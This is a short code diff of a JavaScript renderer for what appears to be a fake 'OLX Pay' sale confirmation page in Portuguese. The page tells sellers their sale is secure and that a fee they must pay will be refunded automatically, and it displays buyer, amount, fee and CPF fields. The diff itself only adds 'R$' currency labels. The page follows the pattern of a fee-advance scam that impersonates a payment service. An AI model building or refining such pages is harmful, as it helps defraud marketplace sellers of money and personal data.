@@ -55,11 +55,11 @@ function renderContainer(dadosBrutos) {
 
   content.innerHTML = `
     <p>🎉 <span class="highlight">Parabéns!</span> Você vendeu seu produto com segurança.</p>
-    <p>Após o pagamento da taxa de <span class="highlight" id="taxa">${taxa}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${prazo}</span>. Seu seguro está ativo.</p>
+    <p>Após o pagamento da taxa de R$<span class="highlight" id="taxa">${taxa}</span>, todos os valores serão <span class="highlight">reembolsados automaticamente em até ${prazo}</span>. Seu seguro está ativo.</p>
     
     <h2>Detalhes da transação</h2>
     <p><i class="fa-solid fa-user icon"></i> <strong>Comprador(a):</strong> <span>${dados.comprador || '---'}</span></p>
-    <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto:</strong> <span>${dados.valor || '---'}</span></p>
+    <p><i class="fa-solid fa-money-bill-wave icon"></i> <strong>Valor do produto: R$</strong> <span>${dados.valor || '---'}</span></p>
     <p><i class="fa-solid fa-truck icon"></i> <strong>Frete:</strong> <span>${dados.frete || 'Grátis'}</span></p>
     <p><i class="fa-solid fa-shield-halved icon"></i> <strong>Tarifa OLX Pay:</strong> <span>${dados.tarifa || 'Inclusa'}</span></p>
     ${dados.cpf ? `<p><i class="fa-solid fa-id-card icon"></i> <strong>CPF:</strong> <span>${dados.cpf}</span></p>` : ''}
@@ -185,4 +185,4 @@ function criarElemento(tag, attrs = {}, inner = '') {
   if (typeof inner === 'string') el.innerHTML = inner;
   else if (inner instanceof Node) el.appendChild(inner);
   return el;
-}
+    }
